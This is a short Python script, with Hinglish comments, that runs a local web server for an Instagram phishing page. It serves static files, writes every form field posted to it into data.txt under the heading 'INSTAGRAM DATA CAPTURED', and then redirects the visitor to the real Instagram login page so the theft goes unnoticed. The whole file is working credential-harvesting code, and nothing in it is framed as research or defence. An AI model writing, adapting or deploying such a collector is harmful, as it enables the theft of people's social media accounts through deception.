import http.server
import socketserver
from urllib.parse import parse_qs
import os

PORT = 8080

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # Data ki length nikalna
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Data ko parse (alag-alag) karna
        fields = parse_qs(post_data)

        # Data save karna
        with open("data.txt", "a") as f:
            f.write("\n--- INSTAGRAM DATA CAPTURED ---\n")
            for key, value in fields.items():
                f.write(f"{key}: {value[0]}\n")
            f.write("-------------------------------\n")

        # Redirect to Real Instagram
        self.send_response(301)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()

    def do_GET(self):
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

socketserver.TCPServer.allow_reuse_address = True
try:
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[!] Master Server Running on Port {PORT}...")
        httpd.serve_forever()
except Exception as e:
    print(f"Error: {e}")
